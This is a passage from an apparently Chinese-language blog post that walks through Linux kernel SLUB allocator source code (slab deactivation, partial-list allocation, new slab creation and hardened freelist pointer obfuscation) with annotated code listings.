class="hljs-comment"> */</span><br>VM_BUG_ON(!c-&gt;slab-&gt;frozen);<br>c-&gt;freelist = get_freepointer(s, freelist);<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">return</span> freelist;<br></code></pre></td></tr></table></figure><p>这里注意在 <code>get_freepointer()</code> 里套了两层，最后会调用到 <code>freelist_ptr()</code> 获取到第二个空闲对象的指针，这里需要注意的是当开启了 Hardened freelist 保护后在 next 指针的位置存放的是 <strong>第一个空闲对象地址 ^ 第二个空闲对象地址 ^ 一个随机值</strong>（<code>kmem_cache-&gt;random</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 返回 freelist 指针 (ptr). 在有加固的情况下其通过一个</span><br><span class="hljs-comment"> * 对存储指针的地址与 per-cache 随机值的异或进行混淆.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">freelist_ptr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *ptr,</span><br><span class="hljs-params"> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr_addr)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当开启了 CONFIG_KASAN_SW/HW_TAGS, ptr_addr 可能被打上标签.</span><br><span class="hljs-comment"> * 通常这不会造成任何问题，因为 set_freepointer() 与 get_freepointer() </span><br><span class="hljs-comment"> * 调用时都会有标签相同的指针.</span><br><span class="hljs-comment"> * 但是 CONFIG_SLUB_DEBUG 的代码有些问题. 例如当 __free_slub() 在</span><br><span class="hljs-comment"> * 一个 cache 中迭代对象时,其将没有标签的指针传给 check_object(). </span><br><span class="hljs-comment"> * check_object() 依次带着一个没有标签的指针调用 get_freepointer()，</span><br><span class="hljs-comment"> * 从而造成 freepointer 存储错误.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr ^ s-&gt;random ^<br>swab((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)ptr_addr)));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">return</span> ptr;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>从这里我们也可以看出 <strong>slab-&gt;freelist 是没有加密的，但链表上的后续指针都是加密了的</strong></p><h4 id="④-deactivate-slab：deactivate-percpu-slab"><a href="#④-deactivate-slab：deactivate-percpu-slab" class="headerlink" title="④ deactivate_slab：deactivate percpu slab"></a>④ deactivate_slab：deactivate percpu slab</h4><p>继续返回 <code>___slab_alloc()</code> 中，接下来这块代码对应 <code>deactivate_slab</code> 标签，首先还是惯例地检查是否被抢占调度到了别的 CPU，若是则跳转回 <code>reread_slab</code>；之后就是简单地将 percpu 的 slab 和 freelist 设为 NULL 并获取下一个 tid，之后调用 <code>deactivate_slab()</code> 将这张 slab 给 deactivate 了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">deactivate_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (slab != c-&gt;slab) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>deactivate_slab(s, slab, freelist);<br></code></pre></td></tr></table></figure><p><code>deactivate_slab()</code> 的逻辑如下：</p><ul><li>遍历 freelist 检查是否被破坏，放弃被破坏的部分</li><li>将 <code>slab-&gt;freelist</code> 设为原 <code>kmem_cache_cpu-&gt;freelist</code>，若 slab 上原有 freelist 不为 NULL 则再接到后面</li><li>设置 slab 的 counters，其中<strong>将 <code>frozen</code> 设为 0</strong></li><li>若 slab 上的对象全部空闲**且 node 的 partial slab 数量大于 <code>kmem_cache-&gt;min_partial</code>**，调用 <code>discard_slab()</code> 将 slab 释放</li><li>若 slab 上存在空闲对象，调用 <code>add_partial()</code> 将其加入 node 的 partial 链表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 结束移除 cpu slab. 合并 cpu&#x27;s freelist 与 slab&#x27;s freelist,</span><br><span class="hljs-comment"> * 解冻 slabs 并放在合适的链表上.</span><br><span class="hljs-comment"> * 假设 slab 已经被调用者安全地从 kmem_cache_cpu 上取下.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">deactivate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *freelist)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> &#123;</span> M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> get_node(s, slab_nid(slab));<br><span class="hljs-type">int</span> free_delta = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> <span class="hljs-title">mode</span> =</span> M_NONE;<br><span class="hljs-type">void</span> *nextfree, *freelist_iter, *freelist_tail;<br><span class="hljs-type">int</span> tail = DEACTIVATE_TO_HEAD;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">old</span>;</span><br><br><span class="hljs-keyword">if</span> (slab-&gt;freelist) &#123;<br>stat(s, DEACTIVATE_REMOTE_FREES);<br>tail = DEACTIVATE_TO_TAIL;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 阶段一: 统计 cpu&#x27;s freelist 上的对象数量（free_delta） </span><br><span class="hljs-comment"> * 并保存最后一个对象（freelist_tail） 用于后面的拼接.</span><br><span class="hljs-comment"> */</span><br>freelist_tail = <span class="hljs-literal">NULL</span>;<br>freelist_iter = freelist;<br><span class="hljs-keyword">while</span> (freelist_iter) &#123;<br>nextfree = get_freepointer(s, freelist_iter);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若 &#x27;nextfree&#x27; 无效, 在 &#x27;freelist_iter&#x27; 上的对象可能已被破坏.</span><br><span class="hljs-comment"> * 故通过略过 &#x27;freelist_iter&#x27; 起的所有对象来进行隔离.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))<br><span class="hljs-keyword">break</span>;<br><br>freelist_tail = freelist_iter;<br>free_delta++;<br><br>freelist_iter = nextfree;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 阶段二: 解冻slab并将per-cpu freelist拼接到slab&#x27;s freelist头部.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 确保链表的存在反映了在解冻期间实际的对象数量时，slab 已被解冻.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们首先在持有锁的情况下进行compxchg并当其成功时将 slab 插入链表.</span><br><span class="hljs-comment"> * 若有不匹配的情况则 slab 为未冻结且 slab 上的数量可能发生了改变.</span><br><span class="hljs-comment"> * 释放锁并再次重试 cmpxchg.</span><br><span class="hljs-comment"> */</span><br>redo:<br><br>old.freelist = READ_ONCE(slab-&gt;freelist);<br>old.counters = READ_ONCE(slab-&gt;counters);<br>VM_BUG_ON(!old.frozen);<br><br><span class="hljs-comment">/* 确定 slab 的目标状态 */</span><br>new.counters = old.counters;<br><span class="hljs-keyword">if</span> (freelist_tail) &#123;<br>new.inuse -= free_delta;<br>set_freepointer(s, freelist_tail, old.freelist);<br>new.freelist = freelist;<br>&#125; <span class="hljs-keyword">else</span><br>new.freelist = old.freelist;<br><br>new.frozen = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) &#123;<br>mode = M_FREE;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.freelist) &#123;<br>mode = M_PARTIAL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 持有自旋锁消除了acquire_slab()看到一个slab为冻结的可能性</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mode = M_FULL_NOLIST;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!cmpxchg_double_slab(s, slab,<br>old.freelist, old.counters,<br>new.freelist, new.counters,<br><span class="hljs-string">&quot;unfreezing slab&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (mode == M_PARTIAL)<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (mode == M_PARTIAL) &#123;<br>add_partial(n, slab, tail);<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, tail);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FREE) &#123;<br>stat(s, DEACTIVATE_EMPTY);<br>discard_slab(s, slab);<br>stat(s, FREE_SLAB);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FULL_NOLIST) &#123;<br>stat(s, DEACTIVATE_FULL);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="④-new-slab：获取-percpu-partial-slab"><a href="#④-new-slab：获取-percpu-partial-slab" class="headerlink" title="④ new_slab：获取 percpu partial slab"></a>④ new_slab：获取 percpu partial slab</h4><p>接下来是 <code>new_slab</code> 标签，主要就是检查若有 percpu partial slab 则从 percpu partial 链表上获取一个 slab 将其设为 percpu slab 后 再跳转回 <code>redo</code> 标签：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">new_slab:<br><br><span class="hljs-keyword">if</span> (slub_percpu_partial(c)) &#123;<span class="hljs-comment">//有 percpu partial slab</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<span class="hljs-comment">//percpu slab 不为空，直接跳回 redo</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(!slub_percpu_partial(c))) &#123;<span class="hljs-comment">//被抢占然后partial空了</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-comment">/* 我们被抢占了且 partial 链表空了 */</span><br><span class="hljs-keyword">goto</span> new_objects;<br>&#125;<br><br><span class="hljs-comment">// 获取一张 percpu patial slab，跳回 redo</span><br>slab = c-&gt;slab = slub_percpu_partial(c);<br>slub_set_percpu_partial(c, slab);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, CPU_PARTIAL_ALLOC);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="⑤-new-objects：获取-node-pertial-slab-或向-buddy-请求新-slab-进行分配"><a href="#⑤-new-objects：获取-node-pertial-slab-或向-buddy-请求新-slab-进行分配" class="headerlink" title="⑤ new_objects：获取 node pertial slab 或向 buddy 请求新 slab 进行分配"></a>⑤ new_objects：获取 node pertial slab 或向 buddy 请求新 slab 进行分配</h4><p>若 percpu partial 链表也为空，那么便来到接下来的 <code>new_objects</code> 标签分配一个新的 slab，首先会设置 <code>partial_context</code>，调用 <code>get_partial()</code> 尝试从 <code>kmem_cache_node</code> 的 partial 链表分配一个 slab，若分配成功则直接跳转到 <code>check_new_slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">new_objects:<br><br>pc.flags = gfpflags;<br>pc.slab = &amp;slab;<br>pc.orig_size = orig_size;<br>freelist = get_partial(s, node, &amp;pc);<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> check_new_slab;<br><br></code></pre></td></tr></table></figure><p><code>get_partial()</code> 首先会调用 <code>get_partial_node()</code> 从当前 node 的 <code>kmem_cache_node</code> 的 partial 链表分配 slab，若成功了则直接返回，如果失败了但是指定了分配的 node 为 <code>NUMA_NO_NODE</code>，则调用 <code>get_any_partial()</code> 从其他的 <code>kmem_cache_node</code> 的 partial 链表尝试分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 获取一个 partial slab, 加锁并返回.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_partial</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">int</span> node, <span class="hljs-keyword">struct</span> partial_context *pc)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">int</span> searchnode = node;<br><br><span class="hljs-keyword">if</span> (node == NUMA_NO_NODE)<br>searchnode = numa_mem_id();<br><br><span class="hljs-comment">// 从当前 node 的 partial 链表分配 slab</span><br>object = get_partial_node(s, get_node(s, searchnode), pc);<br><span class="hljs-keyword">if</span> (object || node != NUMA_NO_NODE)<br><span class="hljs-keyword">return</span> object;<br><br><span class="hljs-comment">// 从其他 node 的 partial 链表分配 slab</span><br><span class="hljs-keyword">return</span> get_any_partial(s, pc);<br>&#125;<br></code></pre></td></tr></table></figure><p>若 <code>get_partial()</code> 没法获取到 slab，则调用 <code>new_slab()</code> 向 buddy system 请求一份新的 slab，若失败了则直接返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">slub_put_cpu_ptr(s-&gt;cpu_slab);<br>slab = new_slab(s, gfpflags, node);<br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<br>slab_out_of_memory(s, gfpflags, node);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>stat(s, ALLOC_SLAB);<br></code></pre></td></tr></table></figure><p><code>new_slab()</code> 最后会调用到 <code>allocate_slab()</code>：</p><ul><li>首先检查页面分配标志位，之后调用 <code>alloc_slab_page()</code> 在指定 node 上进行分配<ul><li>若 <code>node == NUMA_NO_NODE</code>，则该函数会调用 <code>alloc_pages()</code>，否则会调用 <code>__alloc_pages_node()</code></li></ul></li><li>若失败了则再次调用  <code>alloc_slab_page()</code>  尝试进行最小内存分配（<code>kmem_cache-&gt;min</code>），仍失败则直接返回 NULL</li><li>初始化 slab 各成员，并调用 <code>shuffle_freelist()</code> 为空闲对象构造随机化链表，若未开启随机化则将空闲对象按顺序连接</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> slab *<span class="hljs-title function_">allocate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span> =</span> s-&gt;oo;<br><span class="hljs-type">gfp_t</span> alloc_gfp;<br><span class="hljs-type">void</span> *start, *p, *next;<br><span class="hljs-type">int</span> idx;<br><span class="hljs-type">bool</span> shuffle;<br><br>flags &amp;= gfp_allowed_mask;<br><br>flags |= s-&gt;allocflags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 让最初的 higher-order 分配在内存压力下失败</span><br><span class="hljs-comment"> * 由此我们返回到最小 order 的分配.</span><br><span class="hljs-comment"> */</span><br>alloc_gfp = (flags | __GFP_NOWARN | __GFP_NORETRY) &amp; ~__GFP_NOFAIL;<br><span class="hljs-keyword">if</span> ((alloc_gfp &amp; __GFP_DIRECT_RECLAIM) &amp;&amp; oo_order(oo) &gt; oo_order(s-&gt;min))<br>alloc_gfp = (alloc_gfp | __GFP_NOMEMALLOC) &amp; ~__GFP_RECLAIM;<br><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<span class="hljs-comment">//分配失败，尝试最小内存分配</span><br>oo = s-&gt;min;<br>alloc_gfp = flags;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 分配可能因为碎片化而失败.</span><br><span class="hljs-comment"> * 可能的话尝试一个 lower order 的分配</span><br><span class="hljs-comment"> */</span><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>stat(s, ORDER_FALLBACK);<br>&#125;<br><br>slab-&gt;objects = oo_objects(oo);<br>slab-&gt;inuse = <span class="hljs-number">0</span>;<br>slab-&gt;frozen = <span class="hljs-number">0</span>;<br><br>account_slab(slab, oo_order(oo), s, flags);<br><br>slab-&gt;slab_cache = s;<br><br>kasan_poison_slab(slab);<br><br>start = slab_address(slab);<br><br>setup_slab_debug(s, slab, start);<br><br><span class="hljs-comment">//开启了随机化会在该函数内随机连接</span><br>shuffle = shuffle_freelist(s, slab);<br><br><span class="hljs-comment">//未开启随机化，按顺序连接</span><br><span class="hljs-keyword">if</span> (!shuffle) &#123;<br>start = fixup_red_left(s, start);<br>start = setup_object(s, start);<br>slab-&gt;freelist = start;<br><span class="hljs-keyword">for</span> (idx = <span class="hljs-number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="hljs-number">1</span>; idx++) &#123;<br>next = p + s-&gt;size;<br>next = setup_object(s, next);<br>set_freepointer(s, p, next);<br>p = next;<br>&#125;<br>set_freepointer(s, p, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> slab;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用了一个函数 <code>set_freepointer()</code>，主要就是用 <code>freelist_ptr()</code> 向 <code>object + s-&gt;offset</code> 的位置写入用 <code>freelist_ptr()</code> 加密后的 <code>fp</code> 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">set_freepointer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *object, <span class="hljs-type">void</span> *fp)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)object + s-&gt;offset;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br>BUG_ON(object == fp); <span class="hljs-comment">/* naive detection of double free or corruption */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)freeptr_addr);<br>*(<span class="hljs-type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>返回 <code>___slab_alloc()</code>，如果<strong>该 kmem_cache 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位</strong>，则接下来会调用 <code>alloc_single_from_new_slab()</code> <strong>从新获取到的 slab 上分配一个对象后将 slab 重新挂回 partial&#x2F;full 链表</strong>，若分配失败则跳转回 <code>new_objects</code>，成功则直接返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br>freelist = alloc_single_from_new_slab(s, slab, orig_size);<br><br><span class="hljs-keyword">if</span> (unlikely(!freelist))<br><span class="hljs-keyword">goto</span> new_objects;<br><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果没有设置 <code>SLAB_DEBUG_FLAGS</code> 标志位，则接下来获取 slab 的 freelist，并调用 <code>inc_slabs_node()</code> 增加 node 上的计数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * No other reference to the slab yet so we can</span><br><span class="hljs-comment"> * muck around with it freely without cmpxchg</span><br><span class="hljs-comment"> */</span><br>freelist = slab-&gt;freelist;<br>slab-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>slab-&gt;inuse = slab-&gt;objects;<br>slab-&gt;frozen = <span class="hljs-number">1</span>;<br><br>inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);<br></code></pre></td></tr></table></figure><h4 id="⑥-check-new-slab：检查-slab"><a href="#⑥-check-new-slab：检查-slab" class="headerlink" title="⑥ check_new_slab：检查 slab"></a>⑥ check_new_slab：检查 slab</h4><p>接下来对新获取的 slab 进行检查，若该 kmem_cache 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位，检查是否设置了 <code>SLAB_STORE_USER</code> 标志位，之后直接返回 freelist</p><p>接下来调用 <code>pfmemalloc_match()</code> 检查 slab 与分配标志位是否不匹配，若是则调用 <code>deactivate_slab()</code> 使其不再活动并返回 freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 